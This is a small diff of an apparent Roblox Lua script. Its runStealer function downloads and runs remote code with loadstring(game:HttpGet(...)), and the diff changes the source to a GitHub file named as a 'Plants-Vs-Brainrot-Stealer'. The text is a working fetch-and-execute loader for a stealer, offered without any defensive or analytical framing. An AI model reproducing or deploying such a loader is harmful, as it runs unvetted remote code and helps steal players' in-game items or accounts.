@@ -4,7 +4,7 @@ end
 
 local function runStealer()
     task.wait(3) 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rayz-Hub-Main/Stealer/refs/heads/main/Plants-Vs-Zomvie-Hah", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ingenioushits/Stealer/refs/heads/main/Plants-Vs-Brainrot-Stealer.lua",true))()
 end
 
 task.spawn(loadUI)
